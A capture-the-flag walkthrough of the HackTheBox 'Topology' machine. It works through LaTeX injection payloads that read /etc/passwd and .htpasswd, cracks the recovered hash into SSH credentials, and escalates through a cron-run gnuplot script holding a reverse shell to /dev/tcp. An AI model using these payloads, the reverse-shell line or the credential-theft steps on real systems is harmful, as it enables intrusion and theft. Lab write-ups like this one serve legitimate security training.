
Begin with adding your ip address to `/etc/hosts`:

![[HackTheBox/Topology/images/2.png]]

I'll conduct port scanning operation:

```bash
sudo nmap -sV -sC topology.htb
```

![[HackTheBox/Topology/images/1.png]]

```bash
dirsearch -u http://topology.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[HackTheBox/Topology/images/4.png]]

On port `80`, page refer to another domain and fuzzing does not result in juicy results:

![[HackTheBox/Topology/images/3.png]]

Let's add the custom domain to `/etc/hosts` file as well.

Then LaTex php script generates images where you insert on input:

![[HackTheBox/Topology/images/5.png]]

I found very useful page especially for crafting LaTex language command injections:

https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary

Additionally, I tried `\input{/etc/passwd}` ,but page sanitized.

![[HackTheBox/Topology/images/6.png]]

However, most of the payloads did not work on this page.

I found a page consisting related functionality where you can input something and returns PDF or image.

https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a

In the writeup, it references a link where you can reach another juicy extended payloads.

https://0day.work/hacking-with-latex/

![[HackTheBox/Topology/images/7.png]]

It was not able to parse entire `/etc/passwd` content ,but indicates the input field vulnerable to LaTex injection.

![[HackTheBox/Topology/images/8.png]]


After multiple times of efforts, I could not run any commands ,so I decided to shift on subdomain enumeration (vhost):

```bash
ffuf -H "Host: FUZZ.topology.htb" -H "User-Agent: PENTEST" -c -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -u http://topology.htb
```


Discovered interesting results:

![[HackTheBox/Topology/images/9.png]]

![[HackTheBox/Topology/images/11.png]]

I did not add `dev` subdomain to `hosts` file.

![[HackTheBox/Topology/images/10.png]]

Let's add it ->

![[12.png]]

On `dev` subdomain I encountered http auth ,so I research a bit more then saw hacktricks's guide on latex injection:

https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html

`\lstinputlisting{/etc/hosts}` it did not work as well.

LateX has special element trigger for commands:

https://www.overleaf.com/learn/latex/Commands

Let's add dollar symbol to our payload

![[13.png]]

`$\lstinputlisting{/etc/passwd}$`

Now it is possible to reach `/etc/passwd`

![[14.png]]

I tried to read configuration files ,but this did not work. I moved to understand in simple LFI payloads to read other files in `/var/www/html/.htaccess` ,yet got error.

```bash
$\lstinputlisting{/var/www/apache/.htaccess}$
```

I already discovered page on `dev` subdomain then simple logic can results in `dev` capture:

```bash
$\lstinputlisting{/var/www/dev/.htaccess}$
```

![[15.png]]

Let's switch on `/var/www/dev/.htpasswd`

![[16.png]]

Let's try to auth `SSH` as `vdaisley`:

`vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

Let's check the type of hash ->

```bash
hash-identifier


HASH: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

![[17.png]]

John automatically identified the type of hash and suggested --format parameter.

```bash
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt

john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt

john --show md5.txt
```

![[18.png]]

Let's auth through `vdaisley:calculus20`.

It worked.

![[19.png]]

`cat /user.txt`. Next, I could not check any commands run on `sudo` it simply disabled on host.

![[20.png]]

We have to run `linpeas.sh` on target:

```bash
On attacker:

python -m http.server 1000

Target Host (use /tmp/ directory due to the permissions)
curl http://10.10.16.64:1000/linpeas.sh -o linpeas.sh
```

1-2 hours later I found that the attacker vector is most likely triggers itself through a binary read + write perms:

![[21.png]]

write perms on `gnuplot`

![[22.png]]

Because of privileges of binary I decided to check if there are some moves through GFTObins especially in SUID.

![[23.png]]

I also attempted to get `SUID` privileges of binary still stuck on it.

![[24.png]]

However, we have write perms so I also understand whether it generates something in somewhere.

https://stackoverflow.com/questions/5497889/is-there-a-standard-file-extension-for-gnuplot-files

![[25.png]]

In this case, it will be suitable to try all extensions to test whether the binary uses cronjob or not.

```bash
Not worked
echo 'system("touch /tmp/E")' > /opt/gnuplot/E.sh

Worked ->
echo 'system("touch /tmp/ErkanUcar2")' > /opt/gnuplot/cuneyt2.plt
```


![[26.png]]

If cron see `.plt` extension then automatically runs command inside the `system()` method.

```bash
penelope -p 443


echo 'system("sh -i >& /dev/tcp/10.10.16.64/443 0>&1")' > /opt/gnuplot/OumoutChouseinoglou.plt
```

![[27.png]]

Actually it is burden I'll read directly flag as assuming root flag located on `/root/`:

```bash
echo 'system("cat /root/root.txt > /tmp/flag.txt")' > /opt/gnuplot/onurcan.plt
```

![[28.png]]

Instead of waiting for reverse shell this approach completes entire priv esc vector.

